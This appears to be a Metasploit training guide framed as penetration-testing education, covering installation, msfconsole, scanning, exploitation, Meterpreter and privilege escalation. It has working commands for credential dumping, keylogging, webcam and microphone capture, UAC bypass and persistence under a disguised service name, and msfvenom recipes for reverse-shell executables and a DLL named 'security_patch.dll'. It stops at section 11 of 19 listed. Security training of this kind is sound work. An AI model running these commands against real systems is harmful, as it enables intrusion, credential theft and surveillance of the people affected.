# 🎯 Metasploit Framework: The Professional Master Roadmap
## Complete Hands-On Guide: Beginner to Elite Security Engineer

---

## 📋 Executive Overview & Table of Contents

The **Metasploit Framework (MSF)**, developed and maintained by **Rapid7**, is the world’s most widely deployed penetration testing platform. It provides security engineers, ethical hackers, red teams, and mobile security researchers with a unified, modular ecosystem for vulnerability verification, exploit development, payload generation, network pivoting, and post-exploitation assessment.

This roadmap provides a comprehensive, technically rigorous, and production-tested guide covering every facet of Metasploit—from foundational architecture and console navigation to advanced Android mobile exploitation, memory-resident Meterpreter operations, custom Ruby module authoring, and professional enterprise penetration testing workflows.

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        METASPLOIT FRAMEWORK CORE ECOSYSTEM                             │
├────────────────────────────────────────────────────────────────────────────────────────┤
│  Interfaces:     msfconsole (CLI) │ msfvenom (Payloads) │ msfdb (Postgres) │ msfrpcd   │
│  Modules:        Exploits │ Payloads │ Auxiliary │ Post │ Encoders │ NOPs │ Evasion    │
│  Payload Types:  Singles (Inline) │ Stagers (Fetchers)  │ Stages (Meterpreter / VNC)   │
│  Database Layer: Hosts │ Services │ Vulnerabilities │ Credentials │ Loot │ Workspaces │
│  Ecosystem:      Nmap │ Burp Suite │ MobSF │ JADX │ APKTool │ Frida │ Nessus │ Hashcat │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

### Table of Contents
1. [Metasploit Fundamentals & Architecture](#1-metasploit-fundamentals--architecture)
2. [Installation & Environment Setup](#2-installation--environment-setup)
3. [Metasploit Modules Architecture & Directory Structure](#3-metasploit-modules-architecture--directory-structure)
4. [Module Deep Dives & Types](#4-module-deep-dives--types)
5. [msfconsole Command Masterclass](#5-msfconsole-command-masterclass)
6. [Reconnaissance, Port Scanning & Service Enumeration](#6-reconnaissance-port-scanning--service-enumeration)
7. [Exploitation Fundamentals & Methodology](#7-exploitation-fundamentals--methodology)
8. [Payloads & Staging Architecture](#8-payloads--staging-architecture)
9. [Meterpreter Masterclass](#9-meterpreter-masterclass)
10. [Post-Exploitation & Privilege Escalation](#10-post-exploitation--privilege-escalation)
11. [msfvenom Payload Generation & Encoding](#11-msfvenom-payload-generation--encoding)
12. [Auxiliary Scanners, Authentication & Credential Auditing](#12-auxiliary-scanners-authentication--credential-auditing)
13. [Database & Workspace Management](#13-database--workspace-management)
14. [Network Pivoting & Lateral Movement](#14-network-pivoting--lateral-movement)
15. [Exploit Development & Custom Ruby Modules](#15-exploit-development--custom-ruby-modules)
16. [Android Penetration Testing with Metasploit](#16-android-penetration-testing-with-metasploit)
17. [Tool Integration Masterclass](#17-tool-integration-masterclass)
18. [Professional Penetration Testing Methodology & Reporting](#18-professional-penetration-testing-methodology--reporting)
19. [Practical Labs & 10-Tier Learning Roadmap](#19-practical-labs--10-tier-learning-roadmap)

---

## 1. Metasploit Fundamentals & Architecture

### 1.1 Core Terminology & Definitions

Understanding Metasploit requires absolute precision with foundational concepts. The table below outlines core terminology used across all operational phases:

| Term | Technical Definition | Real-World Enterprise Example |
|---|---|---|
| **Vulnerability** | A flaw, weakness, or logic bug in software, hardware, or configuration that permits unauthorized actions. | Unpatched SMBv1 remote code execution flaw (CVE-2017-0144). |
| **Exploit** | Code or sequence of commands engineered to leverage a vulnerability to achieve code execution or compromise. | `exploit/windows/smb/ms17_010_eternalblue` delivering shellcode to kernel memory. |
| **Payload** | The specific binary code or script executed on the victim machine once the exploit triggers successfully. | A staged `windows/x64/meterpreter/reverse_tcp` establishing an interactive shell. |
| **Shellcode** | Low-level machine instructions (opcodes) injected into target process memory during binary exploitation. | Assembler byte array `\x31\xc0\x50\x68...` spawning `/bin/sh`. |
| **Stager** | A compact payload stub whose sole function is to connect back to the attacker and download the full stage. | A 250-byte TCP stub establishing socket communication and allocating executable memory. |
| **Stage** | The primary, full-featured payload loaded dynamically into memory by the stager. | Meterpreter DLL (`metsrv.dll`) loaded reflectively without touching disk. |
| **Target** | The system, service, application, or endpoint undergoing authorized security assessment. | Windows Server 2019 hosting IIS, or an Android banking application. |
| **Attacker Machine** | The system hosting Metasploit Framework and handler listeners. | Kali Linux workstation (`192.168.1.50`) running `msfconsole`. |
| **Victim Machine** | The target host running vulnerable software being validated. | Metasploitable 3 Windows VM (`192.168.1.120`). |
| **Session** | An active, interactive bidirectional control channel established between Metasploit and a compromised target. | Active Meterpreter session ID `1` connected via TCP socket. |
| **Listener / Handler** | A background service on the attacker machine configured to catch incoming payload connections. | `exploit/multi/handler` listening on `0.0.0.0:4444`. |
| **Post-Exploitation** | Actions executed after gaining a session: privilege escalation, loot gathering, credential dumping, persistence. | Dumping local SAM hashes or auditing Android runtime permissions. |
| **Pivoting** | Routing network traffic through an initial compromised host into an otherwise unreachable internal network. | Routing `10.10.20.0/24` subnet traffic through an edge DMZ web server session. |
| **Encoder** | An algorithm that obfuscates shellcode to eliminate bad characters (e.g., null bytes `\x00`) or disrupt static signatures. | `x86/shikata_ga_nai` polymorphic XOR feedback encoder. |
| **NOP Sled** | A sequence of No-Operation machine instructions (`0x90` on x86) allowing execution to glide safely into shellcode. | 16-byte padding prepended to shellcode to compensate for imprecise return addresses. |
| **Exploit Rank** | An assessment metric defining module reliability and system crash probability (e.g., `Excellent`, `Manual`). | `Excellent` rank for memory leaks that never crash target daemons. |

---

### 1.2 Editions: Metasploit Framework vs. Metasploit Pro

| Feature / Capability | Metasploit Framework (Community / CLI) | Metasploit Pro (Commercial) |
|---|---|---|
| **License & Cost** | Open-source (BSD 3-Clause) / Free | Commercial Subscription (Rapid7) |
| **Primary Interface** | Interactive CLI (`msfconsole`), scripts (`msfvenom`) | Web Graphical User Interface (Browser-based) + CLI |
| **Target Audience** | Security engineers, penetration testers, researchers | Enterprise SOC teams, compliance auditors, red teams |
| **Vulnerability Scanning** | Manual auxiliary scanners + DB imports | Automated discovery, Nexpose integration, scheduled scans |
| **Phishing & Social Eng.** | Manual templates, payload generation | Automated campaigns, email tracking, credential harvesting |
| **Reporting Engine** | Manual loot export, markdown/text notes | Automated executive & compliance PDF/HTML reports |
| **Automation & Tasks** | Custom Ruby scripts, Resource files (`.rc`) | Task chains, Quick Start wizards, multi-user workspaces |
| **Dynamic AV Evasion** | Basic encoders, manual payload obfuscation | Dynamic payload mutation, automated artifact generation |

---

### 1.3 Core Command-Line Interfaces & Tools

Metasploit consists of several distinct executables residing in the system PATH:

1. **`msfconsole`**: The primary interactive, command-driven interface. Centralizes all modules, database interaction, session handling, and reconnaissance.
2. **`msfvenom`**: The dedicated standalone payload generation and encoding utility. Replaces legacy `msfpayload` and `msfencode`.
3. **`msfdb`**: The database administration script used to initialize, configure, start, stop, and clean the PostgreSQL database backend.
4. **`msfrpcd` / `msfrpc`**: The Remote Procedure Call daemon. Exposes Metasploit functionalities over REST/JSON and MessagePack APIs for headless automation, CI/CD pipelines, and tool integration.
5. **`msf-pattern_create` & `msf-pattern_offset`**: Standalone binary analysis tools for calculating memory offsets during buffer overflow development.
6. **`msf-nasm_shell`**: Interactive assembler/disassembler shell to convert assembly instructions into hex opcodes.

---

## 2. Installation & Environment Setup

### 2.1 Multi-Platform Installation Guide

#### A. Kali Linux / Parrot OS (Pre-installed)
Metasploit is natively bundled with Kali Linux. Ensure the latest version and database drivers are updated:
```bash
sudo apt update && sudo apt install -y metasploit-framework postgresql
```

#### B. Ubuntu / Debian / RHEL / CentOS
Rapid7 provides an official omnibus installer script:
```bash
# Download and execute the official Rapid7 installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall
```

#### C. macOS (via Homebrew)
```bash
# Install Metasploit on macOS
brew install metasploit
```

#### D. Docker Containerized Deployment
For isolated, disposable testing environments without host modifications:
```bash
# Pull official Rapid7 Metasploit image
docker pull metasploitframework/metasploit-framework

# Run interactive container with local storage mount
docker run --rm -it \
  -v ~/.msf4:/root/.msf4 \
  -p 4444:4444 \
  metasploitframework/metasploit-framework
```

---

### 2.2 PostgreSQL Database Integration

A functioning PostgreSQL database is vital for professional penetration testing. The database caches module metadata (reducing `search` execution from 15 seconds to 0.1 seconds), indexes discovered hosts, open ports, service banners, captured credentials, and extracted loot.

#### Step-by-Step Database Initialization:
```bash
# 1. Start and enable PostgreSQL daemon
sudo systemctl enable --now postgresql

# 2. Initialize the Metasploit database schema and credentials
sudo msfdb init

# 3. Check msfdb operational status
msfdb status
# Expected output:
# [+] Checking for PostgreSQL service ... [ running ]
# [+] Checking for database schema ... [ initialized ]

# 4. Launch msfconsole with database pre-connected
msfconsole -q
```

Inside `msfconsole`, verify the connection:
```text
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

If the database is disconnected, reconnect using the configuration file:
```text
msf6 > db_connect -y /usr/share/metasploit-framework/config/database.yml
```

---

### 2.3 Workspace Management

Workspaces enforce data isolation between distinct engagements, clients, or network segments. Data collected in one workspace never pollutes another.

```text
# List existing workspaces
msf6 > workspace
* default

# Create a dedicated workspace for a new engagement
msf6 > workspace -a FinCorp_External_Assessment
[*] Added workspace: FinCorp_External_Assessment
[*] Workspace: FinCorp_External_Assessment

# Switch between workspaces
msf6 > workspace default
[*] Workspace: default

# Delete an engagement workspace when completed
msf6 > workspace -d FinCorp_External_Assessment
[*] Deleted workspace: FinCorp_External_Assessment
```

---

## 3. Metasploit Modules Architecture & Directory Structure

### 3.1 Framework Directory Layout

On Debian/Kali systems, Metasploit resides in `/usr/share/metasploit-framework/`. User configurations and custom modules reside in `~/.msf4/`.

```
/usr/share/metasploit-framework/
├── modules/
│   ├── auxiliary/        # Scanners, fuzzers, DoS, servers, protocol probes
│   ├── encoders/         # XOR, alphanumeric, and architecture-specific encoders
│   ├── evasion/          # Modules designed to evade endpoint antivirus/EDR
│   ├── exploits/         # Exploits organized by OS and target service
│   ├── nops/             # NOP sled generators across architectures
│   ├── payloads/         # Singles, stagers, and stages (Meterpreter, VNC)
│   └── post/             # Post-exploitation modules (gather, privesc, persistence)
├── plugins/              # Ruby plugins extending msfconsole (Nessus, OpenVAS)
├── data/                 # Wordlists, exploit templates, binaries, meterpreter DLLs
└── tools/                # pattern_create, pattern_offset, nasm_shell, etc.

~/.msf4/
├── history               # Command execution history
├── local/                # Custom user-written modules (same hierarchy as modules/)
├── loot/                 # Files, credentials, and artifacts downloaded from targets
└── logs/                 # Console output and session audit logs
```

---

### 3.2 The Seven Core Module Types

```
                                  ┌─────────────────────────────┐
                                  │      Metasploit Modules     │
                                  └──────────────┬──────────────┘
         ┌───────────────┬────────────────┬──────┴──────┬───────────────┬──────────────┐
         ▼               ▼                ▼             ▼               ▼              ▼
    ┌─────────┐    ┌───────────┐    ┌──────────┐  ┌───────────┐   ┌───────────┐   ┌─────────┐
    │Exploits │    │ Payloads  │    │Auxiliary │  │   Post    │   │ Encoders  │   │ Evasion │
    │(Triggers│    │ (Code to  │    │(Scanners,│  │(PrivEsc,  │   │ (Badchar  │   │(AV/EDR  │
    │ Flaws)  │    │ Execute)  │    │ Fuzzers) │  │ Looting)  │   │ Removal)  │   │ Bypass) │
    └─────────┘    └───────────┘    └──────────┘  └───────────┘   └───────────┘   └─────────┘
```

1. **Exploits (`modules/exploits/`)**: Code that takes advantage of a target vulnerability to grant code execution. Organized by platform: `windows/`, `linux/`, `android/`, `multi/`, `osx/`, `solaris/`.
2. **Payloads (`modules/payloads/`)**: Binary code delivered to the target upon successful exploitation. Divided into:
   - **`singles/`**: Standalone, complete payloads (e.g., add user, execute local command).
   - **`stagers/`**: Initial small socket setups that download stages.
   - **`stages/`**: Advanced payload bodies (e.g., Meterpreter, VNC injection).
3. **Auxiliary (`modules/auxiliary/`)**: Modules that perform actions without deploying a payload. Examples: port scanners, banner grabbers, fuzzers, authentication brute-forcers, denial of service checks.
4. **Post (`modules/post/`)**: Modules executed inside an active session. Examples: hash extraction, local privilege escalation suggestions, network interface enumeration, persistence creation.
5. **Encoders (`modules/encoders/`)**: Tools that rewrite shellcode to eliminate bad characters (`\x00`, `\x0a`) or bypass basic signature-based pattern matchers.
6. **NOPs (`modules/nops/`)**: No-Operation generators for x86, x64, ARM, MIPS architectures to produce reliable slide buffers.
7. **Evasion (`modules/evasion/`)**: Dedicated modules to build executables that actively evade modern endpoint defenses like Windows Defender and AMSI.

---

## 4. Module Deep Dives & Types

### 4.1 Exploits Deep Dive
- **Remote Exploits**: Target services listening on the network without requiring prior system credentials (e.g., `exploit/windows/smb/ms17_010_eternalblue`, `exploit/multi/http/log4shell_header_injection`).
- **Local Exploits**: Executed on a target where the attacker already has an unprivileged session, with the goal of escalating to root or SYSTEM (e.g., `exploit/linux/local/dirty_cow`, `exploit/windows/local/cve_2020_0796_smbv3_privesc`).
- **Client-Side Exploits**: Target end-user software via social engineering or spear-phishing (e.g., malicious Office macros, crafted PDF files, rogue browser links: `exploit/windows/browser/ms14_064_ole_code_execution`).

### 4.2 Auxiliary Modules Deep Dive
- **Scanners**: Systematically test target ranges for services, banners, and default accounts (e.g., `auxiliary/scanner/portscan/syn`, `auxiliary/scanner/ssh/ssh_version`).
- **Fuzzers**: Transmit malformed inputs to protocols (SMB, HTTP, FTP) to discover crashes and unhandled exceptions.
- **Admin Utilities**: Perform administrative tasks on accessible services (e.g., `auxiliary/admin/http/tomcat_administration`).
- **Server Emulators**: Run rogue services on the attacker machine to harvest credentials (e.g., `auxiliary/server/capture/smb` capturing NetNTLM hashes).

### 4.3 Payloads Architecture: Singles vs. Stagers vs. Stages

```
   STAGED PAYLOAD ARCHITECTURE (e.g., windows/x64/meterpreter/reverse_tcp)
   
   Attacker Machine                                          Target Machine
   ┌───────────────────────┐                                 ┌───────────────────────┐
   │ Exploit sends Stager  │ ─────── 1. Exploit Delivery ───>│ Target memory receives│
   │ (e.g. 250 bytes)      │                                 │ small Stager          │
   │                       │                                 │                       │
   │ Exploit Multi Handler │ <────── 2. Reverse Connection ──│ Stager executes, calls│
   │ listens on port 4444  │                                 │ back to attacker      │
   │                       │                                 │                       │
   │ Handler transmits full│ ─────── 3. Transmit Stage ─────>│ Target loads stage    │
   │ Meterpreter DLL stage │                                 │ reflectively in RAM   │
   │                       │                                 │                       │
   │ Interactive Session   │ <====== 4. Encrypted C2 ========│ Full Meterpreter      │
   │ Established           │                                 │ Session active        │
   └───────────────────────┘                                 └───────────────────────┘
```

- **Naming Convention Distinction**:
  - `windows/x64/meterpreter/reverse_tcp`: Notice the two forward slashes (`/meterpreter/`). This indicates a **Staged** payload.
  - `windows/x64/meterpreter_reverse_tcp`: Notice the underscore (`meterpreter_reverse_tcp`). This indicates a **Single / Stageless** payload (the stager and stage are bundled into a single binary).

---

## 5. msfconsole Command Masterclass

### 5.1 Navigation & Discovery Commands

```text
# Launch msfconsole quietly (suppress banner)
msfconsole -q

# Display framework version
msf6 > version
Framework: 6.3.35-dev
Console  : 6.3.35-dev

# Search modules with advanced filter operators
msf6 > search type:exploit platform:windows cve:2021 rank:excellent smb

# Show module documentation and technical references
msf6 > info exploit/windows/smb/ms17_010_eternalblue

# Select and activate a module
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) >

# Return to root console prompt
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 >
```

### 5.2 Configuration & Parameter Management

```text
# Inspect required and optional parameters
msf6 exploit(...) > show options

# View advanced module configurations (timeouts, evasions, proxies)
msf6 exploit(...) > show advanced

# View valid target operating systems and service versions
msf6 exploit(...) > show targets

# View all payloads compatible with this specific exploit
msf6 exploit(...) > show payloads

# Set local module option
msf6 exploit(...) > set RHOSTS 192.168.1.120
RHOSTS => 192.168.1.120

# Set global option (persists across module switches)
msf6 exploit(...) > setg LHOST 192.168.1.50
LHOST => 192.168.1.50

# Unset parameters
msf6 exploit(...) > unset RHOSTS
msf6 exploit(...) > unsetg LHOST
```

### 5.3 Execution, Jobs & Sessions

```text
# Safe vulnerability verification without running the exploit
msf6 exploit(...) > check
[*] 192.168.1.120:445 - The target is vulnerable.

# Execute exploit synchronously
msf6 exploit(...) > exploit

# Execute exploit or auxiliary scanner in the background as a job
msf6 exploit(...) > exploit -j
[*] Exploit running as background job 0.

# List active background jobs
msf6 exploit(...) > jobs -l

# Terminate a background job
msf6 exploit(...) > jobs -k 0

# List active interactive sessions
msf6 exploit(...) > sessions -l
  Id  Type                   Information               Connection
  --  ----                   -----------               ----------
  1   meterpreter x64/win    NT AUTHORITY\SYSTEM @ WIN  192.168.1.50:4444 -> 192.168.1.120:49158

# Interact with session 1
msf6 exploit(...) > sessions -i 1
meterpreter >

# Upgrade a basic UNIX/Windows shell session to a full Meterpreter session
msf6 > sessions -u 2
```

### 5.4 Logging, Scripting & Resource Files

```text
# Record all console interactions to a local text log
msf6 > spool /root/pentest_audit_log.txt
[*] Spooling to file /root/pentest_audit_log.txt...

# Turn current console commands into an automated resource script
msf6 > makerc /root/setup_handler.rc

# Execute commands from a resource file
msf6 > resource /root/setup_handler.rc
```

---

## 6. Reconnaissance, Port Scanning & Service Enumeration

### 6.1 Auxiliary Port Scanners vs. Nmap
Metasploit provides built-in auxiliary scanners that populate the PostgreSQL database directly, without requiring external tools:

```text
# SYN Port Scanner (Fast, raw socket scan)
msf6 > use auxiliary/scanner/portscan/syn
msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/syn) > set PORTS 21,22,80,443,445,3389,8080
msf6 auxiliary(scanner/portscan/syn) > set THREADS 16
msf6 auxiliary(scanner/portscan/syn) > run

# TCP Connect Scanner (Standard three-way handshake, unprivileged)
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.120
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1024
msf6 auxiliary(scanner/portscan/tcp) > run
```

### 6.2 Service-Specific Fingerprinting Scanners
Once ports are identified, auxiliary modules determine exact daemon versions and configurations:

| Protocol | Auxiliary Scanner Module | Purpose & Detection Capability |
|---|---|---|
| **SMB** | `auxiliary/scanner/smb/smb_version` | OS build, domain name, SMBv1/v2/v3 support. |
| **SMB Vuln** | `auxiliary/scanner/smb/smb_ms17_010` | Confirms MS17-010 EternalBlue vulnerability safely. |
| **SSH** | `auxiliary/scanner/ssh/ssh_version` | OpenSSH / Dropbear version, banner detection. |
| **HTTP** | `auxiliary/scanner/http/http_version` | Web server software (Apache, Nginx, IIS). |
| **HTTP Dir** | `auxiliary/scanner/http/dir_scanner` | Brute-forces directories, admin portals, backup files. |
| **FTP** | `auxiliary/scanner/ftp/ftp_version` | FTP server version and anonymous login checks. |
| **MySQL** | `auxiliary/scanner/mysql/mysql_version` | MySQL version and authentication requirements. |
| **MSSQL** | `auxiliary/scanner/mssql/mssql_ping` | SQL Server instance name, TDS version, named pipes. |

#### Real-World Example: SMB Vulnerability Assessment
```text
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.100-192.168.1.150
msf6 auxiliary(scanner/smb/smb_ms17_010) > set THREADS 10
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.1.120:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 SP1
[*] Scanned 51 of 51 hosts (100% complete)
```

---

## 7. Exploitation Fundamentals & Methodology

### 7.1 The Exploit Lifecycle

```
┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  1. Target &    │ ──> │  2. Safe Check   │ ──> │ 3. Architecture  │
│  Vuln Discovery │     │  Validation      │     │ & Target Select  │
└─────────────────┘     └──────────────────┘     └────────┬─────────┘
                                                          │
┌─────────────────┐     ┌──────────────────┐              │
│  6. Session     │ <── │ 5. Exploit Fire  │ <────────────┘
│  Establishment  │     │ & Payload Inject │     ┌──────────────────┐
└─────────────────┘     └──────────────────┘     │ 4. Payload &     │
                                                 │ Handler Match    │
                                                 └──────────────────┘
```

1. **Target Identification**: Extract service version via scanning or Nmap.
2. **Safe Verification (`check`)**: Execute module `check` command to verify vulnerability without crashing services.
3. **Target Selection**: Specify exact operating system architecture, service pack, or memory offsets.
4. **Payload Selection**: Match target OS (e.g., Windows x64 vs x86) and network egress constraints (reverse TCP vs HTTPS).
5. **Execution**: Transmit exploit buffer and shellcode.
6. **Session Handling**: Catch incoming reverse connection or connect to bind port.

### 7.2 Exploit Reliability Rankings

Metasploit assigns an official reliability rank to every exploit:

| Rank | Reliability Criteria | Safety & Crash Risk |
|---|---|---|
| **Excellent** | Module will never crash the service; uses memory leaks or direct logic flaws. | Zero risk of crashing remote service. |
| **Great** | Module has auto-detection and rarely crashes; service auto-restarts if failed. | Extremely low risk. |
| **Good** | Standard exploit with typical version check; service might crash on incorrect version. | Moderate risk; target verification required. |
| **Normal** | Exploit requires specific target OS / SP selection; failed attempt will crash daemon. | High risk; only test in authorized lab/maintenance. |
| **Average** | Exploit is unreliable or target-dependent (e.g., race conditions, heap sprays). | High risk of denial of service. |
| **Low** | Success rate below 50%; frequently crashes target systems. | Unsafe for production environments. |
| **Manual** | Exploit must be tailored by hand or requires physical/user action. | Variable. |

---

## 8. Payloads & Staging Architecture

### 8.1 Reverse vs. Bind Payloads

```
                     REVERSE CONNECTION (Standard for Pentesting)
┌──────────────────────┐                             ┌──────────────────────┐
│   Attacker Machine   │ <══════ Inbound TCP 4443 ═══│    Target Machine    │
│ (Public IP / Listener│    (Allowed by Target Egress│ (Protected by NAT    │
│  msfconsole handler) │     Firewall Rules)         │  or Inbound Firewall)│
└──────────────────────┘                             └──────────────────────┘

                      BIND CONNECTION (Restricted Egress)
┌──────────────────────┐                             ┌──────────────────────┐
│   Attacker Machine   │ ══════ Outbound TCP 4444 ══>│    Target Machine    │
│ (Connects directly   │   (Requires Direct Access / │ (Opens listening port│
│  to Target Port)     │    No Inbound Firewall)     │  waiting for client) │
└──────────────────────┘                             └──────────────────────┘
```

- **Reverse Payloads (`reverse_tcp`, `reverse_https`)**: Target initiates the connection back to the attacker. Bypasses standard corporate firewalls that block all incoming ports but permit outbound traffic.
- **Bind Payloads (`bind_tcp`)**: Target opens a listening socket on a designated port. The attacker must connect in. Blocked if target is behind NAT or inbound firewall.

### 8.2 Transport Protocols Compared

| Transport | Payload Name Pattern | Firewall Evasion Capability | Deep Packet Inspection (DPI) |
|---|---|---|---|
| **TCP** | `meterpreter/reverse_tcp` | Low (often blocked on non-standard ports) | Readable plaintext stream. |
| **HTTP** | `meterpreter/reverse_http` | Medium (blends with web traffic port 80/8080) | Plaintext HTTP requests with URI patterns. |
| **HTTPS** | `meterpreter/reverse_https`| High (blends into encrypted TLS port 443) | Fully encrypted TLS tunnel; DPI cannot inspect. |
| **Named Pipe** | `meterpreter/reverse_named_pipe`| Maximum (internal Windows IPC) | Ideal for internal lateral movement via SMB. |

---

## 9. Meterpreter Masterclass

### 9.1 Reflective DLL Injection Architecture
Meterpreter does not write an executable file to the target hard drive. It utilizes **Stephen Fewer’s Reflective DLL Injection technique**:
1. Stager allocates read-write-execute (`RWX`) virtual memory inside a running process via `VirtualAlloc`.
2. Stager downloads the Meterpreter server library (`metsrv.dll`).
3. Reflective loader parses the DLL in memory, resolves imports, and calls `DllMain` directly in RAM.
4. **Result**: Zero disk footprint, evading legacy file-based antivirus scanners.

### 9.2 Complete Meterpreter Command Reference

#### A. Core Session & Environmental Commands
```text
meterpreter > help              # List all available commands for current platform
meterpreter > background        # Put active session to background (return to msf)
meterpreter > guid              # Display session Globally Unique Identifier
meterpreter > getuid            # Display target user identity (e.g. NT AUTHORITY\SYSTEM)
meterpreter > sysinfo           # Display target OS, architecture, kernel, domain
meterpreter > exit              # Terminate the Meterpreter session
```

#### B. Process & Memory Management
```text
meterpreter > ps                # Enumerate running processes, PIDs, PPIDs, and arch
meterpreter > migrate 1420      # Inject Meterpreter into stable process (e.g. explorer.exe)
meterpreter > execute -f cmd.exe -i -H  # Execute hidden, interactive process
meterpreter > kill 3048         # Terminate target process PID
```

#### C. File System Commands
```text
meterpreter > pwd               # Print target working directory
meterpreter > ls                # List directory contents with permissions
meterpreter > cd "C:\\Users"     # Change directory
meterpreter > upload /tmp/nc.exe C:\\Windows\\Temp\\nc.exe  # Upload file to target
meterpreter > download "C:\\confidential\\passwords.xlsx" /root/loot/  # Download file
meterpreter > cat C:\\Windows\\System32\\drivers\\etc\\hosts # Read file contents
meterpreter > search -f *.docx -d C:\\Users # Search for sensitive documents
meterpreter > rm C:\\Windows\\Temp\\nc.exe  # Delete remote file
```

#### D. Network & Routing Commands
```text
meterpreter > ipconfig          # Display target network interfaces and IP addresses
meterpreter > route             # Display target routing table
meterpreter > arp               # View target ARP cache (discover neighboring hosts)
meterpreter > netstat           # Display active network connections and listening ports
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.1.50 # Forward local port to remote internal IP
```

#### E. Privilege & Credential Harvesting
```text
meterpreter > getsystem         # Automated privilege escalation to SYSTEM
meterpreter > hashdump          # Dump local SAM database hashes (LM/NTLM)
meterpreter > load kiwi         # Load Mimikatz extension into memory
meterpreter > creds_all         # Dump plaintext passwords, Kerberos tickets, NTLM hashes
meterpreter > lsa_dump_sam      # Extract LSA secrets and local user credentials
```

#### F. Surveillance & Media Capture
```text
meterpreter > screenshot        # Capture desktop screenshot and save to local machine
meterpreter > keyscan_start     # Start in-memory keystroke sniffer
meterpreter > keyscan_dump      # Print captured keystrokes (passwords, messages)
meterpreter > keyscan_stop      # Stop keystroke logger
meterpreter > webcam_list       # List connected cameras
meterpreter > webcam_snap 1     # Take a photograph with camera 1
meterpreter > record_mic -d 10  # Record 10 seconds of microphone audio
```

---

## 10. Post-Exploitation & Privilege Escalation

### 10.1 Automated Exploit Suggestion
Metasploit provides an automated post-exploitation module that checks the target kernel and patch level against the framework’s local exploit database:

```text
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.1.120 - Collecting local exploits for x64/windows...
[*] 192.168.1.120 - 41 exploit checks are being considered...
[+] 192.168.1.120 - exploit/windows/local/cve_2020_0796_smbv3_privesc: The target appears to be vulnerable.
[+] 192.168.1.120 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
```

### 10.2 Windows Privilege Escalation Techniques
1. **UAC Bypass (User Account Control)**:
   ```text
   msf6 > use exploit/windows/local/bypassuac_fodhelper
   msf6 exploit(windows/local/bypassuac_fodhelper) > set SESSION 1
   msf6 exploit(windows/local/bypassuac_fodhelper) > set LHOST 192.168.1.50
   msf6 exploit(windows/local/bypassuac_fodhelper) > run
   # Returns elevated High-Integrity session!
   ```
2. **Unquoted Service Paths**:
   ```text
   msf6 > use exploit/windows/local/unquoted_service_path
   msf6 exploit(windows/local/unquoted_service_path) > set SESSION 1
   msf6 exploit(windows/local/unquoted_service_path) > run
   ```

### 10.3 Linux Privilege Escalation Techniques
```text
# Check sudo permissions and misconfigurations
msf6 > use post/linux/gather/enum_protections
msf6 post(linux/gather/enum_protections) > set SESSION 2
msf6 post(linux/gather/enum_protections) > run

# Exploit SUID or Kernel vulnerabilities
msf6 > use exploit/linux/local/dirty_cow
msf6 exploit(linux/local/dirty_cow) > set SESSION 2
msf6 exploit(linux/local/dirty_cow) > run
```

### 10.4 Persistence Mechanisms (Post-Exploitation)
- **Windows Registry Persistence**:
  ```text
  msf6 > use exploit/windows/local/persistence_service
  msf6 exploit(windows/local/persistence_service) > set SESSION 1
  msf6 exploit(windows/local/persistence_service) > set SERVICE_NAME "WindowsUpdateHealth"
  msf6 exploit(windows/local/persistence_service) > run
  ```
- **Linux Cron Persistence**:
  ```text
  msf6 > use post/linux/manage/persistence_cron
  msf6 post(linux/manage/persistence_cron) > set SESSION 2
  msf6 post(linux/manage/persistence_cron) > run
  ```

---

## 11. msfvenom Payload Generation & Encoding

### 11.1 Syntax & Essential Flags

`msfvenom` combines the capabilities of the legacy `msfpayload` and `msfencode` utilities into a single command-line interface.

```bash
msfvenom -p <PAYLOAD> [OPTIONS] -f <FORMAT> -o <OUTPUT_FILE>
```

| Flag | Parameter | Description & Purpose |
|---|---|---|
| `-p` | `<payload>` | Specifies the payload module (e.g., `windows/x64/meterpreter/reverse_tcp`). |
| `-f` | `<format>` | Output format: Executable (`exe`, `elf`, `macho`, `apk`, `war`, `aspx`, `raw`) or Transform (`c`, `py`, `ps1`, `hex`). |
| `-o` | `<filename>` | Path to save the generated payload output file. |
| `-e` | `<encoder>` | Specifies encoding module (e.g., `x86/shikata_ga_nai`, `cmd/powershell_base64`). |
| `-i` | `<iterations>`| Number of encoding iterations (e.g., `-i 5`). |
| `-b` | `"\x00\x0a..."`| Specifies "bad characters" to exclude from the generated shellcode. |
| `-a` | `<arch>` | Target CPU architecture (`x86`, `x64`, `armle`, `mipsbe`). |
| `--platform` | `<os>` | Target operating system platform (`windows`, `linux`, `android`, `osx`, `java`). |
| `-x` | `<template>` | Existing clean executable file to use as a binary template. |
| `-k` | (none) | Preserve original template execution behavior in a separate worker thread. |

---

### 11.2 Multi-Platform Payload Recipes

#### A. Windows Executables (x64 & x86)
```bash
# Standard 64-bit Windows Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_x64.exe

# 64-bit Windows Encrypted HTTPS Meterpreter (Evades IDS/DPI)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=8443 -f exe -o payload_https.exe

# 64-bit Dynamic Link Library (DLL) for DLL Hijacking
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o security_patch.dll
```
